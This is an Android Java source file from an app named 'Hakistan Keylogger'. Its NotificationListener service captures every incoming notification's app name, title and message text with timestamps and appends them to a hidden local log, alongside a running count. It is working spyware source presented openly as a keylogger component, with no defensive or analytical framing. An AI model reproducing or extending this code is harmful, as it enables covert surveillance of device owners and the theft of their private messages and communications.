package com.hak15tan.hakistankeylogger;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import androidx.annotation.RequiresApi;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;


@RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
public class NotificationListener extends NotificationListenerService {
    public static final String MY_PREFS_NAME = "GPrefs";
    public static final String MY_PREFS_STRING_KEY = "GPrefsStringsKey";
    public static final String MY_PREFS_Notification_Count_KEY = "GPrefsNotificationCountKey";
    public static final String MY_PREFS_Text_Count_KEY = "GPrefsText_CountKey";
    public static final String MY_PREFS_FOCUSED_Count_KEY = "GPrefsFOCUSED_CountKey";
    public static final String MY_PREFS_Clicks_Count_KEY = "GPrefsClicks_CountKey";


    public static boolean isNotificationAccessEnabled = false;

    @Override
    public void onListenerConnected() {
        isNotificationAccessEnabled = true;
    }

    @Override
    public void onListenerDisconnected() {
        isNotificationAccessEnabled = false;
    }


    @Override
    public IBinder onBind(Intent intent) {

        //Log.i("Noti", String.valueOf(isNotificationAccessEnabled));

        return super.onBind(intent);

    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn){
        // Implement what you want here
        DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US);
        String time = df.format(Calendar.getInstance().getTime());

        SharedPreferences.Editor editor = getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE).edit();

        SharedPreferences prefs = getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE);
        String perviousData = prefs.getString(MY_PREFS_STRING_KEY, "Hakistan Keylogger \n");//"No name defined" is the default value.


        String pack = sbn.getPackageName();
       // String ticker = sbn.getNotification().tickerText.toString();
        Bundle extras = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
            extras = sbn.getNotification().extras;
        }
        assert extras != null;
        String title = extras.getString("android.title");
        String text = extras.getCharSequence("android.text").toString();

        String noti_data = "\n\nTime: " + time + "\n" + "App Name: " + pack +"\nTitle: " +title+"\nText: "+text+"\n\n";

        //noti_data = ""

        perviousData = perviousData + noti_data+ "\n";

        editor.putString(MY_PREFS_STRING_KEY, perviousData);

        Long perviousNotiCountData = prefs.getLong(MY_PREFS_Notification_Count_KEY,0);//"No name defined" is the default value.


        Long tosaveCount = perviousNotiCountData + 1;

        editor.putLong(MY_PREFS_Notification_Count_KEY, tosaveCount);
        //editor.putInt("idName", 12);
        editor.apply();

     //  SharedPreferences prefs = getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE);
       // String name = prefs.getString(MY_PREFS_STRING_NAME, "No name defined");//"No name defined" is the default value.
       // int idName = prefs.getInt("idName", 0); //0 is the default value.

      //  Log.i("DTat",name);

      //  Log.i("Package",pack);
       // Log.i("Ticker",ticker);
        //Log.i("Title",title);
       // Log.i("Text",text);

    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn){
        // Implement what you want here
      /*  String pack = sbn.getPackageName();
        String ticker = sbn.getNotification().tickerText.toString();
        Bundle extras = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
            extras = sbn.getNotification().extras;
        }
        String title = extras.getString("android.title");
        String text = extras.getCharSequence("android.text").toString();

        Log.i("Package",pack);
        //Log.i("Ticker",ticker);
        Log.i("Title",title);
        Log.i("Text",text);

        */
    }




}